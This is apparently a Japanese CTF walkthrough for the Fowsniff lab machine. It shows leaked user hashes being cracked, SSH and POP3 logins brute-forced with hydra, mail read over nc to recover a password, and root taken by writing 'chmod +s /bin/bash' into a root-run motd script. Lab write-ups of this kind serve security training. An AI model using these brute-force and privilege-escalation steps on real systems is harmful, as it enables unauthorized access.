### 前提
- popとimapの説明
  - https://www.youtube.com/watch?v=1WwvIgqDMYI
- ncコマンド
### 論点
- pop3コマンド
  - symfonosに似たのある
### keyword
- hydra(pop3),awkコマンド

## 攻略
- nmap
  - 22,80,110,143
- サイトを見る
  - サイトを見ても何もわからんのでネットで調べるんだが、見つけるのが面倒なので下のをコピーしてuser-hash.txtとしてメモっておく 

```
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
```

- 他のポートを調査する
  - サイトを見ても何もわからんので22番ポートであるsshと110,143であるpop3ポートを調査する。とりあえず上のファイルをユーザファイルとパスワードファイルに分離する 
- ユーザファイルを作るために
  - `cat user-hash.txt | awk -F@ '{ print $1 }' > users.txt`
- パスワードファイルを作るためにハッシュ値をcrack stationで解読する
  - `cat user-hash.txt | awk -F: '{ print $2 }' `
  - これをコピーしてcrack stationで一気にhash値をpasswordに変換する
  - 変換したのをpass.txtに貼り付ける
- ユーザとパスワードのファイルを分離したのでhydraでsshできるユーザを探す
  - `hydra -L users.txt -P pass.txt ssh://$IP`
  - 何も出てこないので110,443ポートのをする
- hydraでpop3で使えるユーザ名を見つける
   `hydra -L users.txt -P pass.txt pop3://$IP`
  - seina:scoobydoo2
- pop3に接続
  - ここではncコマンドを使う。ncコマンドはネットワークコマンドの10徳ナイフと呼ばれて、いろいろ使える。普段よく使っているの`-nlvp`はサーバーになる。オプションは何もなしだとクライアント(ブラウザみたいなもの)として使える。他にもポートスキャンとかにも使える
  - `nc $IP 110`
  -  pop3のコマンドをネットで検索する。ファイルの取得はできないのでファイルはコピーしておく。コマンドは大文字で書いてあるが、小文字でもいい
    -  `RETR メッセージ番号`	指定されたメッセージ番号のメッセージ全体を表示する

```
user seina
pass scoobydoo2
list
retr 1
retr 2
```

- mailの形式で保存されている。1280ファイルにはどうでもことしか書いていない。1622ファイルにユーザ名とパスワードがあるのでメモっておく
- hydraでsshできるのを探す
  - `hydra -L users.txt -p S1ck~shell ssh://$IP` 
- ssh
  - 接続の際に何か見たことあるのが出てきた
- id
  - usersグループに属しているのがわかる 
- ls /home
  - 9人ほどユーザがいる 
- suid
  - 特になし、pkexecもない
- sudo -l
  - 使えない 
- userグループを深掘りする
  - `find / -group users -type f 2>/dev/null`
  -  `/opt/cube/cube.sh`という気になるファイルがある。中身を見ると、これはsshで接続の際に見たのと同じ
- sshのログインファイルを見る
  - `/etc/update-motd.d/`にあるので中身を見ると中にあるファイル`00-header`がroot権限で行われているのがわかる
  - そこで/opt/cube/cube.shにreverse-shellかchmod +sを書き込む
  - (補足)Parrotにも`/etc/motd`ファイルはあるので確認する
- rootになる
  - `echo 'chmod +s /bin/bash' > /opt/cube/cube.sh`
  - もう一度sshをやり直す
  - `bash -p`
